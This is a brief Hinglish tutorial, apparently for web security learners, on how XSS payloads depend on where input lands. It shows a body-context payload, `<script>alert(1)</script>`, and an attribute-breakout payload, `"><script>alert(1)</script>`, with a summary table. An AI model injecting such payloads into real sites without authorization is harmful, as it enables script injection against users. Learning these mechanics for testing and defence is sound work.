# Simple Logic

| Part          | Kaam                                                             |
| ------------- | ---------------------------------------------------------------- |
| `"`           | Attribute (jaise alt, title, etc.) band karne ke liye            |
| `>`           | Tag close karne ke liye (jaise `<img>`)                          |
| Baaki payload | Apna code inject karne ke liye (jaise `<script>`, `<svg>`, etc.) |

---

### ✅ 1. Jab HTML aisa ho:

```<div>YAHAN_INPUT_AAYEGA</div>```

Toh tu seedha yeh de sakta hai:

```<script>alert(1)</script>```

Final HTML:

```<div><script>alert(1)</script></div>```

### ➡️ Kaam karega! Kyun?
Kyunkay tu HTML body mein ho, koi attribute nahi hai, toh <script> direct inject ho jaata hai.

---

### ❌ 2. Jab HTML aisa ho:

```<img src="x" alt="YAHAN_INPUT_AAYEGA">```

Toh ab agar tu sirf script tag de de, toh wo attribute ke andar hi reh jaayega — browser ignore kar dega.

---

### ✅ Toh ab tu kya karega?
Tu yeh dega:

```"><script>alert(1)</script>```
Toh HTML banega:

```<img src="x" alt="">```
```<script>alert(1)</script>```

- ➡️ Ab attribute close ho gaya
- ➡️ <img> tag band ho gaya
- ➡️ Tera <script> browser ne run kar diya

---

### Final Formula

| Situation                                                | Kya Inject Karna Hai          |
| -------------------------------------------------------- | ----------------------------- |
| Input directly tag ke andar ho (like `<div>INPUT</div>`) | `<script>alert(1)</script>`   |
| Input attribute ke andar ho (like `alt="INPUT"`)         | `"><script>alert(1)</script>` |

---

